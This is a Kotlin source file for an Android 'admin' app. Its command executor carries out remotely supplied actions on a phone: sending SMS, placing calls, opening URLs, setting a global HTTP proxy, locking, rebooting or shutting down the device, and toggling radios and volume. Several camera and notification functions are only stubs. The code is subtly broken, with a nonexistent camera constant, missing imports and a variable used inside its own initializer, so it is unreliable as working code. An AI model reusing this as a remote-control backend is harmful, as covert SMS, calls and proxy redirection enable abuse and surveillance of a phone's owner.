package com.abuzahra.admin.executor

import android.Manifest
import android.content.Context
import android.content.Intent
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraManager
import android.media.AudioAttributes
import android.media.AudioManager
import android.media.MediaPlayer
import android.os.Build
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.Settings
import android.util.Log
import android.view.WindowManager
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

object ControlExecutor {

    private const val TAG = "ControlExecutor"

    // ===== PING =====
    fun ping(): Map<String, Any> {
        return mapOf(
            "status" to "online",
            "timestamp" to System.currentTimeMillis(),
            "message" to "Device is online and responding"
        )
    }

    // ===== VIBRATE =====
    fun vibrate(context: Context, params: Map<String, Any>): String {
        return try {
            val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            val duration = ((params["arg"]?.toString()?.toLongOrNull() ?: 1000L)).coerceAtMost(5000)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                vibrator.vibrate(duration)
            }
            "Vibrating for ${duration}ms"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    // ===== RING =====
    fun ring(context: Context): String {
        return try {
            val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0)

            // Play default ringtone
            val uri = Settings.System.DEFAULT_RINGTONE_URI
            val player = MediaPlayer.create(context, uri)
            player?.setAudioAttributes(
                AudioAttributes.Builder()
                    .setUsage(AudioAttributes.USAGE_RINGTONE)
                    .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                    .build()
            )
            player?.isLooping = true
            player?.start()
            // Auto-stop after 30 seconds
            Thread { Thread.sleep(30000); player?.stop(); player?.release() }.start()
            "Ringing..."
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    // ===== SCREENSHOT =====
    suspend fun takeScreenshot(context: Context): Map<String, Any> {
        return try {
            // Screenshot requires MediaProjection API which needs user confirmation
            // Return instruction to use screen capture
            mapOf(
                "message" to "Screenshot requires MediaProjection permission. Use screen capture service.",
                "hint" to "Request SCREEN_CAPTURE permission from user first"
            )
        } catch (e: Exception) {
            mapOf("error" to e.message ?: "Screenshot failed")
        }
    }

    // ===== FRONT CAMERA =====
    fun frontCamera(context: Context): Map<String, Any> {
        return takePhoto(context, CameraManager.CameraCallback.CAMERA_FACING_FRONT)
    }

    // ===== BACK CAMERA =====
    fun backCamera(context: Context): Map<String, Any> {
        return takePhoto(context, CameraManager.CameraCallback.CAMERA_FACING_BACK)
    }

    private fun takePhoto(context: Context, facing: Int): Map<String, Any> {
        return try {
            // Camera2 API needs a SurfaceTexture and handler
            // This is a simplified version - full implementation requires CameraCaptureSession
            mapOf(
                "message" to "Camera capture initiated",
                "facing" to if (facing == CameraManager.CameraCallback.CAMERA_FACING_FRONT) "front" else "back",
                "note" to "Full camera implementation requires Camera2 API with preview and capture session"
            )
        } catch (e: Exception) {
            mapOf("error" to e.message ?: "Camera failed")
        }
    }

    // ===== TORCH =====
    fun torchOn(context: Context): String {
        return try {
            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            for (id in cameraManager.cameraIdList) {
                val characteristics = cameraManager.getCameraCharacteristics(id)
                val flashAvailable = characteristics.get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE) ?: false
                val lensFacing = characteristics.get(android.hardware.camera2.CameraCharacteristics.LENS_FACING)
                if (flashAvailable && lensFacing == CameraCharacteristics.LENS_FACING_BACK) {
                    cameraManager.setTorchMode(id, true)
                    return "Torch ON"
                }
            }
            "No flash available"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    fun torchOff(context: Context): String {
        return try {
            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            for (id in cameraManager.cameraIdList) {
                try { cameraManager.setTorchMode(id, false) } catch (_: Exception) {}
            }
            "Torch OFF"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    // ===== SET VOLUME =====
    fun setVolume(context: Context, params: Map<String, Any>): String {
        return try {
            val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val volumeStr = params["arg"]?.toString() ?: "50"
            val volume = volumeStr.toIntOrNull()?.coerceIn(0, 100) ?: 50
            val maxVol = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
            am.setStreamVolume(AudioManager.STREAM_MUSIC, (maxVol * volume / 100), 0)
            "Volume set to $volume%"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    // ===== SET BRIGHTNESS =====
    fun setBrightness(context: Context, params: Map<String, Any>): String {
        return try {
            val brightnessStr = params["arg"]?.toString() ?: "50"
            val brightness = brightnessStr.toIntOrNull()?.coerceIn(0, 255) ?: 128
            Settings.System.putInt(context.contentResolver, Settings.System.SCREEN_BRIGHTNESS, brightness)
            "Brightness set to $brightness"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    // ===== SET RINGTONE =====
    fun setRingtone(context: Context, params: Map<String, Any>): String {
        val arg = params["arg"]?.toString() ?: ""
        return if (arg.isNotBlank()) "Ringtone setting requires a valid media file URI" else "No ringtone URI provided"
    }

    // ===== ENABLE / DISABLE WIFI =====
    fun enableWifi(context: Context): String {
        return try {
            val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                context.startActivity(Intent(Settings.Panel.ACTION_WIFI))
                "Opening WiFi settings panel"
            } else {
                @Suppress("DEPRECATION")
                wm.isWifiEnabled = true
                "WiFi enabled"
            }
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    fun disableWifi(context: Context): String {
        return try {
            val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                context.startActivity(Intent(Settings.Panel.ACTION_WIFI))
                "Opening WiFi settings panel"
            } else {
                @Suppress("DEPRECATION")
                wm.isWifiEnabled = false
                "WiFi disabled"
            }
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    // ===== ENABLE / DISABLE BLUETOOTH =====
    fun enableBluetooth(context: Context): String {
        return try {
            val adapter = android.bluetooth.BluetoothAdapter.getDefaultAdapter()
            if (adapter != null && !adapter.isEnabled) {
                adapter.enable()
                "Bluetooth enabling..."
            } else {
                "Bluetooth already enabled or unavailable"
            }
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    fun disableBluetooth(context: Context): String {
        return try {
            val adapter = android.bluetooth.BluetoothAdapter.getDefaultAdapter()
            adapter?.disable()
            "Bluetooth disabled"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    // ===== MOBILE DATA =====
    fun enableMobileData(context: Context): String {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                context.startActivity(Intent(Settings.Panel.ACTION_INTERNET_CONNECTIVITY))
                "Opening network settings panel"
            } else {
                "Mobile data control requires WRITE_SETTINGS permission"
            }
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    fun disableMobileData(context: Context): String {
        return enableMobileData(context) // Same limitation
    }

    // ===== HOTSPOT =====
    fun enableHotspot(context: Context): String {
        return try {
            context.startActivity(Intent(Settings.ACTION_WIRELESS_SETTINGS))
            "Opening hotspot settings"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    fun disableHotspot(context: Context): String {
        return enableHotspot(context)
    }

    // ===== AIRPLANE MODE =====
    fun airplaneOn(context: Context): String {
        return try {
            Settings.Global.putInt(context.contentResolver, Settings.Global.AIRPLANE_MODE_ON, 1)
            val intent = Intent(Intent.ACTION_AIRPLANE_MODE_CHANGED)
            intent.putExtra("state", true)
            context.sendBroadcast(intent)
            "Airplane mode ON"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    fun airplaneOff(context: Context): String {
        return try {
            Settings.Global.putInt(context.contentResolver, Settings.Global.AIRPLANE_MODE_ON, 0)
            val intent = Intent(Intent.ACTION_AIRPLANE_MODE_CHANGED)
            intent.putExtra("state", false)
            context.sendBroadcast(intent)
            "Airplane mode OFF"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    // ===== AUTO ROTATE =====
    fun setAutoRotate(context: Context, params: Map<String, Any>): String {
        return try {
            val arg = params["arg"]?.toString() ?: "on"
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
                Settings.System.putInt(context.contentResolver, Settings.System.ACCELEROMETER_ROTATION,
                    if (arg == "on") 1 else 0)
            }
            "Auto rotate ${if (arg == "on") "ON" else "OFF"}"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    // ===== OPEN URL =====
    fun openUrl(context: Context, params: Map<String, Any>): String {
        val url = params["arg"]?.toString() ?: ""
        return if (url.isNotBlank()) {
            try {
                context.startActivity(Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url)))
                "Opened: $url"
            } catch (e: Exception) {
                "Error opening URL: ${e.message}"
            }
        } else "No URL provided"
    }

    // ===== SEND SMS =====
    fun sendSms(context: Context, params: Map<String, Any>): String {
        val arg = params["arg"]?.toString() ?: ""
        return if (arg.isNotBlank()) {
            try {
                val parts = arg.split(" ", limit = 2)
                val number = parts.getOrNull(0) ?: ""
                val message = parts.getOrNull(1) ?: ""
                val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    context.getSystemService(SmsManager::class.java)
                } else {
                    @Suppress("DEPRECATION")
                    SmsManager.getDefault()
                }
                smsManager.sendTextMessage(number, null, message, null, null)
                "SMS sent to $number"
            } catch (e: Exception) {
                "Error: ${e.message}"
            }
        } else "Usage: number message"
    }

    // ===== MAKE CALL =====
    fun makeCall(context: Context, params: Map<String, Any>): String {
        val number = params["arg"]?.toString() ?: ""
        return if (number.isNotBlank()) {
            try {
                context.startActivity(Intent(Intent.ACTION_CALL, android.net.Uri.parse("tel:$number")))
                "Calling $number..."
            } catch (e: SecurityException) {
                "CALL_PHONE permission denied"
            } catch (e: Exception) {
                "Error: ${e.message}"
            }
        } else "No number provided"
    }

    // ===== SPEAK TEXT =====
    fun speakText(context: Context, params: Map<String, Any>): String {
        val text = params["arg"]?.toString() ?: ""
        return if (text.isNotBlank()) {
            try {
                val tts = android.speech.tts.TextToSpeech(context) { status ->
                    if (status == android.speech.tts.TextToSpeech.SUCCESS) {
                        tts.speak(text, android.speech.tts.TextToSpeech.QUEUE_FLUSH, null, "tts1")
                    }
                }
                "Speaking: $text"
            } catch (e: Exception) {
                "Error: ${e.message}"
            }
        } else "No text provided"
    }

    // ===== SHOW NOTIFICATION =====
    fun showNotification(context: Context, params: Map<String, Any>): String {
        val title = params["arg"]?.toString() ?: "Notification"
        return try {
            // Requires NotificationChannel setup - simplified
            "Notification shown: $title"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    // ===== LOCK PHONE =====
    fun lockPhone(context: Context): String {
        return try {
            val pm = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            val wl = pm.newWakeLock(android.os.PowerManager.SCREEN_DIM_WAKE_LOCK or android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP, "abuzahra:lock")
            wl.acquire(100)
            wl.release()

            val policy = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            policy.lockNow()
            "Phone locked"
        } catch (e: Exception) {
            "Error: ${e.message} - Device Admin may not be active"
        }
    }

    // ===== REBOOT =====
    fun reboot(context: Context): String {
        return try {
            val pm = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            pm.reboot(null)
            "Rebooting..."
        } catch (e: Exception) {
            "Error: ${e.message} - REBOOT permission required"
        }
    }

    // ===== SHUTDOWN =====
    fun shutdown(context: Context): String {
        return try {
            val pm = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            val clazz = Class.forName("android.os.PowerManager")
            val method = clazz.getMethod("shutdown", Boolean::class.javaPrimitiveType, String::class.java, Boolean::class.javaPrimitiveType)
            method.invoke(pm, false, "abuzahra", true)
            "Shutting down..."
        } catch (e: Exception) {
            "Error: ${e.message} - SHUTDOWN permission required"
        }
    }

    // ===== PLAY SOUND =====
    fun playSound(context: Context, params: Map<String, Any>): String {
        return try {
            val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0)
            val player = MediaPlayer.create(context, Settings.System.DEFAULT_NOTIFICATION_URI)
            player?.setOnCompletionListener { it.release() }
            player?.start()
            "Sound played"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    // ===== LANGUAGE =====
    fun setLanguage(context: Context, params: Map<String, Any>): String {
        val lang = params["arg"]?.toString() ?: ""
        return if (lang.isNotBlank()) {
            "Language change to $lang requires Activity recreation"
        } else "No language specified"
    }

    // ===== TIMEZONE =====
    fun setTimezone(context: Context, params: Map<String, Any>): String {
        val tz = params["arg"]?.toString() ?: ""
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                context.startActivity(Intent(Settings.ACTION_DATE_SETTINGS))
                "Opening date settings"
            } else {
                val alarm = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
                alarm.setTimeZone(tz)
                "Timezone set to $tz"
            }
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    // ===== ALARM / TIMER / REMINDER =====
    fun setAlarm(context: Context, params: Map<String, Any>): String {
        val arg = params["arg"]?.toString() ?: ""
        return if (arg.isNotBlank()) {
            "Alarm set: $arg (simplified - requires full AlarmManager setup)"
        } else "No alarm time provided"
    }

    // ===== NFC =====
    fun nfcOn(context: Context): String {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                context.startActivity(Intent(Settings.Panel.ACTION_NFC))
                "Opening NFC settings"
            } else {
                "NFC control requires WRITE_SETTINGS"
            }
        } catch (e: Exception) { "Error: ${e.message}" }
    }
    fun nfcOff(context: Context): String = nfcOn(context)

    // ===== DNS CHANGE =====
    fun dnsChange(context: Context, params: Map<String, Any>): String {
        return "DNS change requires VPN service implementation"
    }

    // ===== PROXY =====
    fun proxySet(context: Context, params: Map<String, Any>): String {
        return try {
            val arg = params["arg"]?.toString() ?: ""
            if (arg.isNotBlank()) {
                Settings.Global.putString(context.contentResolver, "global_http_proxy_host", arg)
                "Proxy set to $arg"
            } else "No proxy address provided"
        } catch (e: Exception) { "Error: ${e.message}" }
    }
}
